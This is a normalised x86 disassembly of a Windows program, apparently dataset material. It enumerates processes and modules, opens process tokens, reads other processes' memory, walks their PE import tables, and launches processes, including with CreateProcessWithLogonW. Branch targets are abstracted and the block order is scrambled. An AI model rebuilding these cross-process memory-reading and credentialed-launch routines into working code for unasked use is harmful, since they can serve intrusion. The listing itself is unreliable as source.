sar eax 0x1
push eax
lea eax [ esp + 0x7c ]
lea ecx [ esp + 0x3c ]
call sub_401c90
mov [ esp + 0x298 ] 0x0
mov eax [ edi + 0x4 ]
lea ecx [ esp + 0x14 ]
cmp ecx eax
jae r-xdata
lea eax [ esp + 0x54 ]
push eax
push ebx
call [ Process32NextW@IAT ]
test eax eax
je r-xdata
mov ecx [ edi + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ edi ]
cmp edx ecx
ja r-xdata
mov esi [ esp + 0xc ]
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
lea ecx [ esp + 0x18 ]
call sub_40cc90
add esp 0x4
mov edx [ edi ]
sub eax edx
sar eax 0x6
cmp eax 0x3fffffe
ja r-xdata
mov esi ecx
mov ecx [ edi + 0x8 ]
sub esi edx
cmp eax ecx
jne r-xdata
test esi esi
je r-xdata
mov edx [ esp + 0x38 ]
push edx
call sub_43811c
add esp 0x4
push r--data
call sub_435a79
sub ecx edx
inc eax
sar ecx 0x6
cmp eax ecx
jbe r-xdata
mov eax [ edi + 0x4 ]
and esi 0xffffffc0
add esi [ edi ]
push eax
mov ecx esi
call sub_40ca60
jmp r-xdata
sub eax edx
sar eax 0x6
cmp eax 0x3fffffe
ja r-xdata
mov edx ecx
shr edx 0x1
mov esi 0x3ffffff
sub esi edx
cmp esi ecx
jae r-xdata
add [ edi + 0x4 ] 0x40
mov [ esp + 0x298 ] 0xffffffff
cmp [ esp + 0x4c ] 0x8
jb r-xdata
sub ecx edx
inc eax
sar ecx 0x6
cmp eax ecx
jbe r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3ffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
push ecx
mov ecx edi
call sub_40c430
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
mov ecx edi
call sub_40c430
mov ebx [ esp + 0x10 ]
mov ecx eax
cmp ecx eax
jae r-xdata
sub_40b340
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push 0x10
mov ebx eax
mov [ ebp - 0x1 ] 0x0
call sub_438178
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edi esi
call sub_40b0d0
test al al
je r-xdata
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov esi eax
xor ebx ebx
cmp esi ebx
je r-xdata
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx eax
and ecx 0xffffffc0
cmp ecx 0x40
sete cl
mov [ ebp - 0x1 ] cl
test cl cl
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
cmp eax ebx
je r-xdata
mov edx [ eax ]
mov [ ebx ] edx
mov ecx [ eax + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov edx [ eax + 0x8 ]
mov [ ebx + 0x8 ] edx
mov ecx [ eax + 0xc ]
mov [ ebx + 0xc ] ecx
mov edx [ eax + 0x10 ]
mov [ ebx + 0x10 ] edx
mov ecx [ eax + 0x14 ]
mov [ ebx + 0x14 ] ecx
mov edx [ eax + 0x18 ]
mov [ ebx + 0x18 ] edx
mov ecx [ eax + 0x1c ]
mov [ ebx + 0x1c ] ecx
mov edx [ eax + 0x20 ]
add eax 0x24
push 0x0
push eax
lea edi [ ebx + 0x24 ]
or eax 0xffffffff
mov [ ebx + 0x20 ] edx
call sub_401be0
push esi
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
call sub_43811c
add esp 0x4
mov ecx [ ebp - 0x5 ]
mov edi [ esi + 0x4 ]
push ecx
call sub_40cb00
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x8
sub_40b420
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push 0x10
mov [ ebp - 0x1 ] 0x0
call sub_438178
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
xor edi edi
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov edi eax
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
push edi
call sub_40b5a0
add esp 0x8
test al al
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
test eax eax
je r-xdata
mov esi [ edi ]
cmp esi [ edi + 0x4 ]
je r-xdata
mov eax [ edi ]
jmp r-xdata
xor eax eax
push edi
mov [ edi ] eax
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
call sub_43811c
add esp 0x4
mov ecx [ ebp - 0x5 ]
mov ebx [ edi + 0x4 ]
push ecx
call sub_40cb40
mov edx [ edi ]
push edx
call sub_43811c
add esp 0x8
cmp [ esi + 0x34 ] 0x8
jb r-xdata
mov esi [ ebp + 0x8 ]
call sub_40b4f0
mov [ ebp - 0x1 ] 0x1
lea ebx [ esi + 0x20 ]
mov ebx [ esi + 0x20 ]
jmp r-xdata
mov eax esi
add esi 0x58
cmp esi [ edi + 0x4 ]
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_4019f0
push eax
push ebx
call sub_438e70
add esp 0x8
test eax eax
je r-xdata
jmp r-xdata
sub_40b4f0
push ebx
mov ebx eax
mov eax [ ebx ]
mov [ esi ] eax
mov ecx [ ebx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ ebx + 0x8 ]
mov [ esi + 0x8 ] edx
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ ebx + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ ebx + 0x14 ]
mov [ esi + 0x14 ] edx
mov eax [ ebx + 0x18 ]
push edi
mov [ esi + 0x18 ] eax
mov ecx [ ebx + 0x1c ]
push 0x0
lea edx [ ebx + 0x20 ]
push edx
lea edi [ esi + 0x20 ]
or eax 0xffffffff
mov [ esi + 0x1c ] ecx
call sub_401be0
push 0x0
add ebx 0x3c
push ebx
lea edi [ esi + 0x3c ]
or eax 0xffffffff
call sub_401be0
pop edi
mov eax esi
pop ebx
retn
sub_40b550
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
push esi
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
call sub_43811c
add esp 0x4
mov eax esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ebx
mov ebx [ esi + 0x4 ]
push ecx
call sub_40cb40
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x8
pop ebx
sub_40b5a0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452176
mov eax [ fs : 0x0 ]
push eax
sub esp 0x498
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x490 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4a8 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x18 ] eax
mov eax [ ebp + 0xc ]
xor esi esi
cmp eax esi
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
xor al al
lea ecx [ esp + 0x74 ]
push ecx
push edi
mov [ esp + 0x7c ] 0x428
call [ Module32FirstW@IAT ]
test eax eax
je r-xdata
push eax
push 0x18
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
mov [ esp + 0x14 ] edi
cmp edi 0xffffffff
je r-xdata
push edi
call [ CloseHandle@IAT ]
mov al 0x1
jmp r-xdata
mov ebx 0x7
mov ecx [ esp + 0x4a8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x490 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x98 ]
lea ecx [ esp + 0x40 ]
call sub_401c90
mov [ esp + 0x4b0 ] esi
xor edx edx
lea eax [ esp + 0x294 ]
mov [ esp + 0x58 ] dx
mov [ esp + 0x6c ] ebx
mov [ esp + 0x68 ] esi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x298 ]
lea ecx [ esp + 0x5c ]
call sub_401c90
mov edi [ esp + 0x18 ]
lea ecx [ esp + 0x1c ]
mov [ esp + 0x4b0 ] 0x1
call sub_40c080
mov edi 0x8
mov [ esp + 0x4b0 ] 0xffffffff
cmp [ esp + 0x6c ] edi
jb r-xdata
xor ecx ecx
mov [ esp + 0x6c ] ebx
mov [ esp + 0x68 ] esi
mov [ esp + 0x58 ] cx
cmp [ esp + 0x50 ] edi
jb r-xdata
mov eax [ esp + 0x58 ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x74 ]
push eax
push ecx
call [ Module32NextW@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x3c ]
push edx
call sub_43811c
add esp 0x4
mov eax [ esp + 0x78 ]
mov edx [ esp + 0x74 ]
mov ecx [ esp + 0x7c ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x84 ]
mov [ esp + 0x1c ] edx
mov edx [ esp + 0x80 ]
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0x88 ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x90 ]
mov [ esp + 0x28 ] edx
mov edx [ esp + 0x8c ]
mov [ esp + 0x30 ] ecx
mov [ esp + 0x38 ] eax
xor ecx ecx
lea eax [ esp + 0x94 ]
mov [ esp + 0x34 ] edx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x4c ] esi
mov [ esp + 0x3c ] cx
lea edx [ eax + 0x2 ]
mov edi [ esp + 0x14 ]
sub_40b7b0
push ebp
mov ebp esp
sub esp 0x48
xor eax eax
mov [ esi ] eax
push ebx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
push 0x44
push eax
mov [ esi + 0xc ] eax
lea eax [ ebp - 0x48 ]
push eax
call sub_43a820
mov eax [ edi + 0x10 ]
xor ecx ecx
inc eax
mov edx 0x2
mul edx
seto cl
mov [ ebp - 0x48 ] 0x44
neg ecx
or ecx eax
push ecx
call sub_435b34
mov ecx [ edi + 0x10 ]
add esp 0x10
cmp [ edi + 0x14 ] 0x8
mov ebx eax
mov eax ecx
mov edx ecx
jb r-xdata
mov edx edi
mov edx [ edi ]
jmp r-xdata
lea ecx [ ebp - 0x48 ]
push ecx
push 0x0
push 0x0
push eax
push 0x0
push 0x0
push 0x0
push ebx
push 0x0
call [ CreateProcessW@IAT ]
lea edx [ ebp - 0x48 ]
push edx
push ecx
push ecx
push eax
push ebx
push ecx
push 0x2
push r--data
push r--data
push r--data
call [ CreateProcessWithLogonW@IAT ]
jmp r-xdata
push eax
push edx
push ecx
push ebx
call sub_438efb
mov eax [ edi + 0x10 ]
xor ecx ecx
mov [ ebx + eax * 2 ] cx
movzx eax [ ebp + 0x8 ]
add esp 0x10
neg eax
sbb eax eax
and eax 0x4
or eax 0x10
push esi
cmp [ ebp + 0xc ] cl
je r-xdata
test eax eax
push ebx
setne [ ebp - 0x1 ]
call sub_438111
mov al [ ebp - 0x1 ]
add esp 0x4
pop ebx
mov esp ebp
pop ebp
retn
sub_40b890
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push ebx
push esi
push eax
push 0x0
push 0x400
xor bl bl
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x8 ]
pop esi
mov al bl
xor ecx ebp
pop ebx
call sub_437c1c
mov esp ebp
pop ebp
retn
cmp esi 0xffffffff
je r-xdata
lea ecx [ ebp - 0x48 ]
push ecx
push 0x20008
push esi
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x4c ]
push edx
push 0x38
lea eax [ ebp - 0x44 ]
push eax
push 0xa
push ecx
call [ GetTokenInformation@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x38 ]
mov [ edi ] edx
mov [ edi + 0x4 ] eax
sub_40b930
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push 0x18
mov [ ebp - 0x1 ] 0x0
call sub_438178
add esp 0x4
test eax eax
je r-xdata
xor ebx ebx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
mov ebx eax
jmp r-xdata
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
call [ GetCurrentProcess@IAT ]
mov esi eax
mov esi edi
cmp edi 0xffffffff
jne r-xdata
push ebx
call sub_43811c
mov al [ ebp - 0x1 ]
add esp 0x4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x8 ]
push ecx
push 0x18
push ebx
push 0x0
push esi
call eax
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x18
jne r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0x1d8
push edx
push eax
push edi
mov [ ebp - 0x8 ] 0x0
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
push 0x1d8
push eax
push 0x1d8
push edx
call sub_438acf
add esp 0x10
test eax eax
push ebx
sete [ ebp - 0x1 ]
call sub_43811c
mov al [ ebp - 0x1 ]
add esp 0x4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1 ] 0x0
cmp [ ebp - 0x8 ] 0x1d8
mov [ ebp - 0x1 ] 0x1
je r-xdata
sub_40ba20
push ebp
mov ebp esp
push 0xffffffff
push sub_452a6e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
push 0x40
mov [ ebp - 0xcc ] eax
mov [ ebp - 0xac ] edi
mov [ ebp - 0xa2 ] 0x0
call sub_435b34
add esp 0x4
mov esi eax
mov [ ebp - 0xc4 ] esi
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0xb4 ]
push ecx
push 0x40
push esi
push ebx
push edi
mov [ ebp - 0xb4 ] 0x0
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
push 0x40
push ebx
push 0x40
push esi
call sub_438acf
add esp 0x10
test eax eax
sete al
test al al
je r-xdata
push esi
call sub_438111
mov al [ ebp - 0xa2 ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xb4 ] 0x40
je r-xdata
push 0x40
push esi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx 0x5a4d
cmp [ esi ] dx
jne r-xdata
push 0xf8
call sub_435b34
mov edx [ esi + 0x3c ]
mov edi eax
mov eax [ ebp - 0xac ]
add esp 0x4
add edx ebx
mov esi 0xf8
mov ecx edi
mov [ ebp - 0xc8 ] edi
call sub_406510
test al al
je r-xdata
push edi
call sub_438111
mov esi [ ebp - 0xc4 ]
add esp 0x4
push esi
push edi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
cmp [ edi ] 0x4550
jne r-xdata
cmp [ edi + 0x80 ] eax
je r-xdata
mov eax [ edi + 0x84 ]
test eax eax
je r-xdata
push eax
call sub_435b34
mov edx [ edi + 0x80 ]
mov esi [ edi + 0x84 ]
mov ecx eax
mov eax [ ebp - 0xac ]
add esp 0x4
add edx ebx
mov [ ebp - 0xb4 ] ecx
call sub_406510
mov esi [ ebp - 0xb4 ]
test al al
je r-xdata
push esi
call sub_438111
add esp 0x4
push 0x14
push esi
call [ IsBadReadPtr@IAT ]
test eax eax
sete al
mov [ ebp - 0xa2 ] al
test al al
je r-xdata
cmp [ esi ] 0x0
je r-xdata
lea edi [ esi + 0xc ]
mov [ ebp - 0xb0 ] edi
jmp r-xdata
push 0x4
call sub_435b34
push 0x4
mov [ ebp - 0xb8 ] eax
call sub_435b34
mov [ ebp - 0xc0 ] eax
xor eax eax
add esp 0x8
mov [ ebp - 0xdc ] eax
mov [ ebp - 0xd8 ] eax
mov [ ebp - 0xd4 ] eax
mov ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] eax
mov edx [ edi - 0xc ]
mov eax [ ebp - 0xac ]
add edx ebx
mov esi 0x4
call sub_406510
test al al
je r-xdata
mov esi [ ebp - 0xb8 ]
mov [ ebp - 0xbc ] 0x0
lea esp [ esp ]
mov edi [ ebp - 0xb0 ]
add edi 0x14
lea esi [ ebp - 0xdc ]
mov [ ebp - 0xb0 ] edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_40c130
cmp [ edi - 0xc ] 0x0
jne r-xdata
lea esi [ ecx + 0x1 ]
push esi
call sub_435b34
mov ecx [ ebp - 0xb0 ]
mov edx [ ecx ]
mov edi eax
mov eax [ ebp - 0xac ]
add esp 0x4
add edx ebx
mov ecx edi
mov [ ebp - 0xa8 ] edi
call sub_406510
test al al
je r-xdata
mov esi [ ebp - 0xb8 ]
mov eax [ esi ]
xor ecx ecx
cmp eax ecx
je r-xdata
mov edi [ ebp - 0xb0 ]
mov edi [ ebp - 0xc8 ]
mov esi [ ebp - 0xb4 ]
push edi
call sub_438111
add esp 0x4
push edi
lea ecx [ ebp - 0x30 ]
call sub_408110
lea edx [ ebp - 0xdc ]
push edx
lea ecx [ ebp - 0x78 ]
push ecx
mov edi eax
mov [ ebp - 0x4 ] 0x3
call sub_40c960
add esp 0x8
mov esi [ ebp - 0xcc ]
mov [ ebp - 0x4 ] 0x4
call sub_40c270
lea esi [ ebp - 0x78 ]
call sub_40bf30
lea ecx [ ebp - 0x30 ]
call sub_405a40
mov edi [ ebp - 0xa8 ]
mov edx [ ebp - 0xc0 ]
push edx
call sub_438111
push esi
call sub_438111
mov eax [ ebp - 0xac ]
mov esi [ edi ]
push eax
lea ecx [ ebp - 0xa8 ]
push ecx
add esi ebx
lea edx [ ebp - 0xa1 ]
push edx
lea eax [ esi + 0xff ]
push eax
push esi
mov edi 0x1
mov [ ebp - 0xa1 ] 0x0
mov [ ebp - 0xa8 ] 0x0
call sub_406610
mov ecx [ ebp - 0xa8 ]
add esp 0x1c
sub ecx esi
test al al
je r-xdata
mov edx [ edi + 0x4 ]
add edx [ ebp - 0xbc ]
mov [ ebp - 0x80 ] 0xf
add edx ebx
mov [ ebp - 0xa0 ] edx
mov edx [ ebp - 0xc0 ]
mov edx [ edx ]
mov [ ebp - 0x9c ] edx
xor edx edx
mov [ ebp - 0x98 ] dx
mov [ ebp - 0x84 ] ecx
mov [ ebp - 0x94 ] cl
mov [ ebp - 0x4 ] 0x1
test eax eax
jns r-xdata
mov [ ebp - 0xa8 ] ecx
mov ecx [ ebp - 0xac ]
push ecx
lea esi [ eax + ebx + 0x2 ]
lea edx [ ebp - 0xa8 ]
push edx
lea eax [ ebp - 0xa1 ]
push eax
lea ecx [ esi + 0xff ]
push ecx
push esi
mov edi 0x1
mov [ ebp - 0xa1 ] 0x0
call sub_406610
mov ecx [ ebp - 0xa8 ]
add esp 0x14
sub ecx esi
test al al
je r-xdata
mov [ ebp - 0x98 ] ax
jmp r-xdata
lea ecx [ ebp - 0xa0 ]
lea edi [ ebp - 0xdc ]
call sub_40c170
mov esi 0x4
add [ ebp - 0xbc ] esi
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x80 ] 0x10
jb r-xdata
lea esi [ ecx + 0x4 ]
push esi
call sub_435b34
mov edx [ ebp - 0xb8 ]
mov edx [ edx ]
mov edi eax
mov eax [ ebp - 0xac ]
add esp 0x4
add edx ebx
mov ecx edi
mov [ ebp - 0xa8 ] edi
call sub_406510
test al al
je r-xdata
mov ecx [ ebp - 0xb0 ]
mov edx [ ecx - 0xc ]
add edx [ ebp - 0xbc ]
mov eax [ ebp - 0xac ]
mov ecx [ ebp - 0xb8 ]
add edx ebx
call sub_406510
mov edi [ ebp - 0xb0 ]
test al al
jne r-xdata
mov eax [ ebp - 0x94 ]
push eax
call sub_43811c
add esp 0x4
push edi
call sub_438111
add esp 0x4
add edi 0x2
push edi
lea ecx [ ebp - 0x4c ]
call sub_408110
mov edi eax
lea esi [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x2
call sub_405c40
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x1
call sub_405a40
mov edi [ ebp - 0xa8 ]
mov edx [ edi + 0x4 ]
add edx [ ebp - 0xbc ]
mov eax [ ebp - 0xac ]
mov ecx [ ebp - 0xc0 ]
add edx ebx
mov esi 0x4
call sub_406510
test al al
je r-xdata
sub_40bf30
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x1c ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x4 ]
push edi
mov edi [ esi + 0x20 ]
push ecx
call sub_40cba0
mov edx [ esi + 0x1c ]
push edx
call sub_43811c
add esp 0x8
pop edi
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] 0xf
mov [ esi ] bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
sub_40bf90
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x1 ] 0x0
cmp esi edi
jne r-xdata
mov eax [ esi ]
mov edx [ esi + 0x4 ]
cmp eax edx
je r-xdata
push 0x10
call sub_438178
add esp 0x4
cmp eax edi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ eax + 0x8 ] ecx
sete cl
mov [ ebp - 0x1 ] cl
test cl cl
jne r-xdata
xor eax eax
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] edi
jmp r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
mov edx [ eax ]
mov [ ebx ] edx
mov ecx [ eax + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov edx [ eax + 0x8 ]
mov [ ebx + 0x8 ] edx
mov ecx [ eax + 0xc ]
mov [ ebx + 0xc ] ecx
mov edx [ eax + 0x10 ]
mov [ ebx + 0x10 ] edx
mov ecx [ eax + 0x14 ]
mov [ ebx + 0x14 ] ecx
mov edx [ eax + 0x18 ]
mov [ ebx + 0x18 ] edx
mov ecx [ eax + 0x1c ]
mov [ ebx + 0x1c ] ecx
mov edx [ eax + 0x20 ]
add eax 0x24
push 0x0
push eax
lea edi [ ebx + 0x24 ]
or eax 0xffffffff
mov [ ebx + 0x20 ] edx
call sub_401be0
add eax 0x40
cmp eax edx
jne r-xdata
xor ecx ecx
mov edi eax
mov esi eax
call sub_40b0d0
test al al
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
jmp r-xdata
xor eax eax
push esi
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
call sub_43811c
add esp 0x4
mov ecx [ ebp + 0xc ]
mov edi [ esi + 0x4 ]
push ecx
call sub_40cb00
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x8
sub_40c080
push ebp
mov ebp esp
push 0xffffffff
push sub_452022
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov eax [ edi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov ecx edi
call sub_40c2e0
sub esi eax
mov eax 0x2e8ba2e9
imul esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x58
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
mov eax [ edi + 0x4 ]
imul esi esi 0x58
add esi [ edi ]
mov [ ebp - 0x10 ] eax
mov ecx esi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx edi
call sub_40c2e0
jmp r-xdata
push eax
call sub_40cd30
sub_40c130
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push edi
mov edi [ esi + 0x4 ]
push ecx
call sub_40cba0
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x8
pop edi
sub_40c170
push ebp
mov ebp esp
push 0xffffffff
push sub_452022
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov eax [ edi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov ecx edi
call sub_40c350
sub esi eax
mov eax 0x66666667
imul esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x28
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov [ eax ] edx
mov ecx [ esi + 0x4 ]
push 0xffffffff
mov [ eax + 0x4 ] ecx
mov dx [ esi + 0x8 ]
push 0x0
add esi 0xc
mov [ eax + 0x8 ] dx
push esi
mov ecx [ edi ]
lea eax [ esi + esi * 4 ]
lea edx [ ecx + eax * 8 ]
mov eax [ edi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx edi
call sub_40c350
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
push 0xffffffff
mov [ eax + 0x4 ] ecx
mov cx [ edx + 0x8 ]
push 0x0
add edx 0xc
mov [ eax + 0x8 ] cx
push edx
jmp r-xdata
lea ecx [ eax + 0xc ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] 0x0
call sub_405cb0
sub_40c270
mov ecx [ esi + 0x4 ]
push edi
mov edi eax
cmp edi ecx
jae r-xdata
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov eax [ esi ]
cmp eax edi
ja r-xdata
mov ecx [ esi + 0x4 ]
push ecx
mov ecx edi
call sub_40c9d0
add [ esi + 0x4 ] 0x2c
add esp 0x4
pop edi
retn
mov ecx esi
call sub_40c3c0
sub edi eax
mov eax 0x2e8ba2e9
imul edi
sar edx 0x3
mov edi edx
shr edi 0x1f
add edi edx
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx edi
imul ecx ecx 0x2c
add ecx [ esi ]
push eax
call sub_40c9d0
add esp 0x4
add [ esi + 0x4 ] 0x2c
pop edi
retn
mov ecx esi
call sub_40c3c0
sub_40c2e0
mov edx [ ecx + 0x4 ]
push esi
push edi
mov edi [ ecx ]
sub edx edi
mov eax 0x2e8ba2e9
imul edx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp esi 0x2e8ba2d
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx edi
mov eax 0x2e8ba2e9
imul edx
sar edx 0x4
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_435a79
pop edi
pop esi
retn
mov edx eax
shr edx 0x1
mov edi 0x2e8ba2e
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_40c510
mov eax esi
cmp eax esi
jae r-xdata
sub_40c350
mov edx [ ecx + 0x4 ]
push esi
push edi
mov edi [ ecx ]
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x4
mov esi edx
shr esi 0x1f
